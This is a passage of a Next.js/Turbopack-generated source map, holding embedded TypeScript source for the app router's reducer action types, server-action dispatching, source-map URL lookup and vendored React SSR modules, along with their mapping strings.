    {"offset": {"line": 457, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/server/route-modules/app-page/vendored/ssr/react-jsx-dev-runtime.ts"],"sourcesContent":["module.exports = require('../../module.compiled').vendored[\n  'react-ssr'\n].ReactJsxDevRuntime\n"],"names":["module","exports","require","vendored","ReactJsxDevRuntime"],"mappings":";AAAAA,OAAOC,OAAO,GAAGC,QAAQ,4HAAyBC,QAAQ,CACxD,YACD,CAACC,kBAAkB","ignoreList":[0],"debugId":null}},
    {"offset": {"line": 464, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/server/route-modules/app-page/vendored/ssr/react.ts"],"sourcesContent":["module.exports = require('../../module.compiled').vendored['react-ssr'].React\n"],"names":["module","exports","require","vendored","React"],"mappings":";AAAAA,OAAOC,OAAO,GAAGC,QAAQ,4HAAyBC,QAAQ,CAAC,YAAY,CAACC,KAAK","ignoreList":[0],"debugId":null}},
    {"offset": {"line": 471, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/client/components/router-reducer/router-reducer-types.ts"],"sourcesContent":["import type { CacheNode } from '../../../shared/lib/app-router-context.shared-runtime'\nimport type {\n  FlightRouterState,\n  FlightSegmentPath,\n} from '../../../server/app-render/types'\nimport type { FetchServerResponseResult } from './fetch-server-response'\n\nexport const ACTION_REFRESH = 'refresh'\nexport const ACTION_NAVIGATE = 'navigate'\nexport const ACTION_RESTORE = 'restore'\nexport const ACTION_SERVER_PATCH = 'server-patch'\nexport const ACTION_PREFETCH = 'prefetch'\nexport const ACTION_HMR_REFRESH = 'hmr-refresh'\nexport const ACTION_SERVER_ACTION = 'server-action'\n\nexport type RouterChangeByServerResponse = ({\n  previousTree,\n  serverResponse,\n}: {\n  previousTree: FlightRouterState\n  serverResponse: FetchServerResponseResult\n}) => void\n\nexport type RouterNavigate = (\n  href: string,\n  navigateType: 'push' | 'replace',\n  shouldScroll: boolean\n) => void\n\nexport interface Mutable {\n  mpaNavigation?: boolean\n  patchedTree?: FlightRouterState\n  canonicalUrl?: string\n  scrollableSegments?: FlightSegmentPath[]\n  pendingPush?: boolean\n  cache?: CacheNode\n  prefetchCache?: AppRouterState['prefetchCache']\n  hashFragment?: string\n  shouldScroll?: boolean\n  preserveCustomHistoryState?: boolean\n  onlyHashChange?: boolean\n}\n\nexport interface ServerActionMutable extends Mutable {\n  inFlightServerAction?: Promise<any> | null\n}\n\n/**\n * Refresh triggers a refresh of the full page data.\n * - fetches the Flight data and fills rsc at the root of the cache.\n * - The router state is updated at the root.\n */\nexport interface RefreshAction {\n  type: typeof ACTION_REFRESH\n  origin: Location['origin']\n}\n\nexport interface HmrRefreshAction {\n  type: typeof ACTION_HMR_REFRESH\n  origin: Location['origin']\n}\n\nexport type ServerActionDispatcher = (\n  args: Omit<\n    ServerActionAction,\n    'type' | 'mutable' | 'navigate' | 'changeByServerResponse' | 'cache'\n  >\n) => void\n\nexport interface ServerActionAction {\n  type: typeof ACTION_SERVER_ACTION\n  actionId: string\n  actionArgs: any[]\n  resolve: (value: any) => void\n  reject: (reason?: any) => void\n}\n\n/**\n * Navigate triggers a navigation to the provided url. It supports two types: `push` and `replace`.\n *\n * `navigateType`:\n * - `push` - pushes a new history entry in the browser history\n * - `replace` - replaces the current history entry in the browser history\n *\n * Navigate has multiple cache heuristics:\n * - page was prefetched\n *  - Apply router state tree from prefetch\n *  - Apply Flight data from prefetch to the cache\n *  - If Flight data is a string, it's a redirect and the state is updated to trigger a redirect\n *  - Check if hard navigation is needed\n *    - Hard navigation happens when a dynamic parameter below the common layout changed\n *    - When hard navigation is needed the cache is invalidated below the flightSegmentPath\n *    - The missing cache nodes of the page will be fetched in layout-router and trigger the SERVER_PATCH action\n *  - If hard navigation is not needed\n *    - The cache is reused\n *    - If any cache nodes are missing they'll be fetched in layout-router and trigger the SERVER_PATCH action\n * - page was not prefetched\n *  - The navigate was called from `next/router` (`router.push()` / `router.replace()`) / `next/link` without prefetched data available (e.g. the prefetch didn't come back from the server before clicking the link)\n *    - Flight data is fetched in the reducer (suspends the reducer)\n *    - Router state tree is created based on Flight data\n *    - Cache is filled based on the Flight data\n *\n * Above steps explain 3 cases:\n * - `soft` - Reuses the existing cache and fetches missing nodes in layout-router.\n * - `hard` - Creates a new cache where cache nodes are removed below the common layout and fetches missing nodes in layout-router.\n * - `optimistic` (explicit no prefetch) - Creates a new cache and kicks off the data fetch in the reducer. The data fetch is awaited in the layout-router.\n */\nexport interface NavigateAction {\n  type: typeof ACTION_NAVIGATE\n  url: URL\n  isExternalUrl: boolean\n  locationSearch: Location['search']\n  navigateType: 'push' | 'replace'\n  shouldScroll: boolean\n  allowAliasing: boolean\n}\n\n/**\n * Restore applies the provided router state.\n * - Used for `popstate` (back/forward navigation) where a known router state has to be applied.\n * - Also used when syncing the router state with `pushState`/`replaceState` calls.\n * - Router state is applied as-is from the history state, if available.\n * - If the history state does not contain the router state, the existing router state is used.\n * - If any cache node is missing it will be fetched in layout-router during rendering and the server-patch case.\n * - If existing cache nodes match these are used.\n */\nexport interface RestoreAction {\n  type: typeof ACTION_RESTORE\n  url: URL\n  tree: FlightRouterState | undefined\n}\n\n/**\n * Server-patch applies the provided Flight data to the cache and router tree.\n * - Only triggered in layout-router.\n * - Creates a new cache and router state with the Flight data applied.\n */\nexport interface ServerPatchAction {\n  type: typeof ACTION_SERVER_PATCH\n  serverResponse: FetchServerResponseResult\n  previousTree: FlightRouterState\n}\n\n/**\n * PrefetchKind defines the type of prefetching that should be done.\n * - `auto` - if the page is dynamic, prefetch the page data partially, if static prefetch the page data fully.\n * - `full` - prefetch the page data fully.\n * - `temporary` - a temporary prefetch entry is added to the cache, this is used when prefetch={false} is used in next/link or when you push a route programmatically.\n */\n\nexport enum PrefetchKind {\n  AUTO = 'auto',\n  FULL = 'full',\n  TEMPORARY = 'temporary',\n}\n\n/**\n * Prefetch adds the provided FlightData to the prefetch cache\n * - Creates the router state tree based on the patch in FlightData\n * - Adds the FlightData to the prefetch cache\n * - In ACTION_NAVIGATE the prefetch cache is checked and the router state tree and FlightData are applied.\n */\nexport interface PrefetchAction {\n  type: typeof ACTION_PREFETCH\n  url: URL\n  kind: PrefetchKind\n}\n\nexport interface PushRef {\n  /**\n   * If the app-router should push a new history entry in app-router's useEffect()\n   */\n  pendingPush: boolean\n  /**\n   * Multi-page navigation through location.href.\n   */\n  mpaNavigation: boolean\n  /**\n   * Skip applying the router state to the browser history state.\n   */\n  preserveCustomHistoryState: boolean\n}\n\nexport type FocusAndScrollRef = {\n  /**\n   * If focus and scroll should be set in the layout-router's useEffect()\n   */\n  apply: boolean\n  /**\n   * The hash fragment that should be scrolled to.\n   */\n  hashFragment: string | null\n  /**\n   * The paths of the segments that should be focused.\n   */\n  segmentPaths: FlightSegmentPath[]\n  /**\n   * If only the URLs hash fragment changed\n   */\n  onlyHashChange: boolean\n}\n\nexport type PrefetchCacheEntry = {\n  treeAtTimeOfPrefetch: FlightRouterState\n  data: Promise<FetchServerResponseResult>\n  kind: PrefetchKind\n  prefetchTime: number\n  staleTime: number\n  lastUsedTime: number | null\n  key: string\n  status: PrefetchCacheEntryStatus\n  url: URL\n}\n\nexport enum PrefetchCacheEntryStatus {\n  fresh = 'fresh',\n  reusable = 'reusable',\n  expired = 'expired',\n  stale = 'stale',\n}\n\n/**\n * Handles keeping the state of app-router.\n */\nexport type AppRouterState = {\n  /**\n   * The router state, this is written into the history state in app-router using replaceState/pushState.\n   * - Has to be serializable as it is written into the history state.\n   * - Holds which segments and parallel routes are shown on the screen.\n   */\n  tree: FlightRouterState\n  /**\n   * The cache holds React nodes for every segment that is shown on screen as well as previously shown segments.\n   * It also holds in-progress data requests.\n   * Prefetched data is stored separately in `prefetchCache`, that is applied during ACTION_NAVIGATE.\n   */\n  cache: CacheNode\n  /**\n   * Cache that holds prefetched Flight responses keyed by url.\n   */\n  prefetchCache: Map<string, PrefetchCacheEntry>\n  /**\n   * Decides if the update should create a new history entry and if the navigation has to trigger a browser navigation.\n   */\n  pushRef: PushRef\n  /**\n   * Decides if the update should apply scroll and focus management.\n   */\n  focusAndScrollRef: FocusAndScrollRef\n  /**\n   * The canonical url that is pushed/replaced.\n   * - This is the url you see in the browser.\n   */\n  canonicalUrl: string\n  /**\n   * The underlying \"url\" representing the UI state, which is used for intercepting routes.\n   */\n  nextUrl: string | null\n}\n\nexport type ReadonlyReducerState = Readonly<AppRouterState>\nexport type ReducerState = Promise<AppRouterState> | AppRouterState\nexport type ReducerActions = Readonly<\n  | RefreshAction\n  | NavigateAction\n  | RestoreAction\n  | ServerPatchAction\n  | PrefetchAction\n  | HmrRefreshAction\n  | ServerActionAction\n>\n"],"names":["ACTION_HMR_REFRESH","ACTION_NAVIGATE","ACTION_PREFETCH","ACTION_REFRESH","ACTION_RESTORE","ACTION_SERVER_ACTION","ACTION_SERVER_PATCH","PrefetchCacheEntryStatus","PrefetchKind"],"mappings":";;;;;;;;;;;;;;;;;;;;;;IAYaA,kBAAkB,EAAA;eAAlBA;;IAJAC,eAAe,EAAA;eAAfA;;IAGAC,eAAe,EAAA;eAAfA;;IAJAC,cAAc,EAAA;eAAdA;;IAEAC,cAAc,EAAA;eAAdA;;IAIAC,oBAAoB,EAAA;eAApBA;;IAHAC,mBAAmB,EAAA;eAAnBA;;IA4MDC,wBAAwB,EAAA;eAAxBA;;IAhEAC,YAAY,EAAA;eAAZA;;;AA/IL,MAAML,iBAAiB;AACvB,MAAMF,kBAAkB;AACxB,MAAMG,iBAAiB;AACvB,MAAME,sBAAsB;AAC5B,MAAMJ,kBAAkB;AACxB,MAAMF,qBAAqB;AAC3B,MAAMK,uBAAuB;AAyI7B,IAAKG,eAAAA,WAAAA,GAAAA,SAAAA,YAAAA;;;;WAAAA;;AAgEL,IAAKD,2BAAAA,WAAAA,GAAAA,SAAAA,wBAAAA;;;;;WAAAA","ignoreList":[0],"debugId":null}},
    {"offset": {"line": 553, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/client/app-call-server.ts"],"sourcesContent":["import { startTransition, useCallback } from 'react'\nimport {\n  ACTION_SERVER_ACTION,\n  type ReducerActions,\n  type ServerActionDispatcher,\n} from './components/router-reducer/router-reducer-types'\n\nlet globalServerActionDispatcher = null as ServerActionDispatcher | null\n\nexport function useServerActionDispatcher(\n  dispatch: React.Dispatch<ReducerActions>\n) {\n  const serverActionDispatcher: ServerActionDispatcher = useCallback(\n    (actionPayload) => {\n      startTransition(() => {\n        dispatch({\n          ...actionPayload,\n          type: ACTION_SERVER_ACTION,\n        })\n      })\n    },\n    [dispatch]\n  )\n  globalServerActionDispatcher = serverActionDispatcher\n}\n\nexport async function callServer(actionId: string, actionArgs: any[]) {\n  const actionDispatcher = globalServerActionDispatcher\n\n  if (!actionDispatcher) {\n    throw new Error('Invariant: missing action dispatcher.')\n  }\n\n  return new Promise((resolve, reject) => {\n    actionDispatcher({\n      actionId,\n      actionArgs,\n      resolve,\n      reject,\n    })\n  })\n}\n"],"names":["callServer","useServerActionDispatcher","globalServerActionDispatcher","dispatch","serverActionDispatcher","useCallback","actionPayload","startTransition","type","ACTION_SERVER_ACTION","actionId","actionArgs","actionDispatcher","Error","Promise","resolve","reject"],"mappings":";;;;;;;;;;;;;;;IA0BsBA,UAAU,EAAA;eAAVA;;IAjBNC,yBAAyB,EAAA;eAAzBA;;;uBAT6B;oCAKtC;AAEP,IAAIC,+BAA+B;AAE5B,SAASD,0BACdE,QAAwC;IAExC,MAAMC,yBAAiDC,CAAAA,GAAAA,OAAAA,WAAW,EAChE,CAACC;QACCC,CAAAA,GAAAA,OAAAA,eAAe,EAAC;YACdJ,SAAS;gBACP,GAAGG,aAAa;gBAChBE,MAAMC,oBAAAA,oBAAoB;YAC5B;QACF;IACF,GACA;QAACN;KAAS;IAEZD,+BAA+BE;AACjC;AAEO,eAAeJ,WAAWU,QAAgB,EAAEC,UAAiB;IAClE,MAAMC,mBAAmBV;IAEzB,IAAI,CAACU,kBAAkB;QACrB,MAAM,OAAA,cAAkD,CAAlD,IAAIC,MAAM,0CAAV,qBAAA;mBAAA;wBAAA;0BAAA;QAAiD;IACzD;IAEA,OAAO,IAAIC,QAAQ,CAACC,SAASC;QAC3BJ,iBAAiB;YACfF;YACAC;YACAI;YACAC;QACF;IACF;AACF","ignoreList":[0],"debugId":null}},
    {"offset": {"line": 621, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/client/app-find-source-map-url.ts"],"sourcesContent":["const basePath = process.env.__NEXT_ROUTER_BASEPATH || ''\nconst pathname = `${basePath}/__nextjs_source-map`\n\nexport const findSourceMapURL =\n  process.env.NODE_ENV === 'development'\n    ? function findSourceMapURL(filename: string): string | null {\n        if (filename === '') {\n          return null\n        }\n\n        if (\n          filename.startsWith(document.location.origin) &&\n          filename.includes('/_next/static')\n        ) {\n          // This is a request for a client chunk. This can only happen when\n          // using Turbopack. In this case, since we control how those source\n          // maps are generated, we can safely assume that the sourceMappingURL\n          // is relative to the filename, with an added `.map` extension. The\n          // browser can just request this file, and it gets served through the\n          // normal dev server, without the need to route this through\n          // the `/__nextjs_source-map` dev middleware.\n          return `${filename}.map`\n        }\n\n        const url = new URL(pathname, document.location.origin)\n        url.searchParams.set('filename', filename)\n\n        return url.href\n      }\n    : undefined\n"],"names":["findSourceMapURL","basePath","process","env","__NEXT_ROUTER_BASEPATH","pathname","NODE_ENV","filename","startsWith","document","location","origin","includes","url","URL","searchParams","set","href","undefined"],"mappings":";;;;+BAGaA,oBAAAA;;;eAAAA;;;AAHb,MAAMC,WAAWC,QAAQC,GAAG,CAACC,sBAAsB,MAAI;AACvD,MAAMC,WAAY,KAAEJ,WAAS;AAEtB,MAAMD,mBACXE,QAAQC,GAAG,CAACG,QAAQ,KAAK,cACrB,SAASN,iBAAiBO,QAAgB;IACxC,IAAIA,aAAa,IAAI;QACnB,OAAO;IACT;IAEA,IACEA,SAASC,UAAU,CAACC,SAASC,QAAQ,CAACC,MAAM,KAC5CJ,SAASK,QAAQ,CAAC,kBAClB;QACA,kEAAkE;QAClE,mEAAmE;QACnE,qEAAqE;QACrE,mEAAmE;QACnE,qEAAqE;QACrE,4DAA4D;QAC5D,6CAA6C;QAC7C,OAAQ,KAAEL,WAAS;IACrB;IAEA,MAAMM,MAAM,IAAIC,IAAIT,UAAUI,SAASC,QAAQ,CAACC,MAAM;IACtDE,IAAIE,YAAY,CAACC,GAAG,CAAC,YAAYT;IAEjC,OAAOM,IAAII,IAAI;AACjB,IACAC","ignoreList":[0],"debugId":null}},
    {"offset": {"line": 663, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/server/route-modules/app-page/vendored/ssr/react-server-dom-turbopack-client-edge.ts"],"sourcesContent":["module.exports = require('../../module.compiled').vendored[\n  'react-ssr'\n].ReactServerDOMTurbopackClientEdge\n"],"names":["module","exports","require","vendored","ReactServerDOMTurbopackClientEdge"],"mappings":";AAAAA,OAAOC,OAAO,GAAGC,QAAQ,4HAAyBC,QAAQ,CACxD,YACD,CAACC,iCAAiC","ignoreList":[0],"debugId":null}},
    {"offset": {"line": 670, "column": 0}, "map": {"version":3,"sources":["file:///home/user/studio/node_modules/next/src/build/webpack/loaders/next-flight-loader/action-client-wrapper.ts"],"sourcesContent":["// This file must be bundled in the app's client layer, it shouldn't be directly\n// imported by the server.\n\nexport { callServer } from 'next/dist/client/app-call-server'\nexport { findSourceMapURL } from 'next/dist/client/app-find-source-map-url'\n\n// A noop wrapper to let the Flight client create the server reference.\n// See also: https://github.com/facebook/react/pull/26632\n// Since we're using the Edge build of Flight client for SSR [1], here we need to\n// also use the same Edge build to create the reference. For the client bundle,\n// we use the default and let Webpack to resolve it to the correct version.\n// 1: https://github.com/vercel/next.js/blob/16eb80b0b0be13f04a6407943664b5efd8f3d7d0/packages/next/src/server/app-render/use-flight-response.tsx#L24-L26\nexport const createServerReference = (\n  (!!process.env.NEXT_RUNTIME\n    ? // eslint-disable-next-line import/no-extraneous-dependencies\n      require('react-server-dom-webpack/client.edge')\n    : // eslint-disable-next-line import/no-extraneous-dependencies\n      require('react-server-dom-webpack/client')) as typeof import('react-server-dom-webpack/client')\n).createServerReference\n"],"names":["callServer","createServerReference","findSourceMapURL","process","env","NEXT_RUNTIME","require"],"mappings":"AAAA,gFAAgF;AAChF,0BAA0B;;;;;;;;;;;;;;;;;IAEjBA,UAAU,EAAA;eAAVA,eAAAA,UAAU;;IASNC,qBAAqB,EAAA;eAArBA;;IARJC,gBAAgB,EAAA;eAAhBA,qBAAAA,gBAAgB;;;+BADE;qCACM;AAQ1B,MAAMD,wBACV,CAAA,CAAC,CAACE,QAAQC,GAAG,CAACC,YAAY,GAEvBC,QAAQ,0CAERA,QAAQ,8JAAiC,EAC7CL,qBAAqB","ignoreList":[0],"debugId":null}}]
}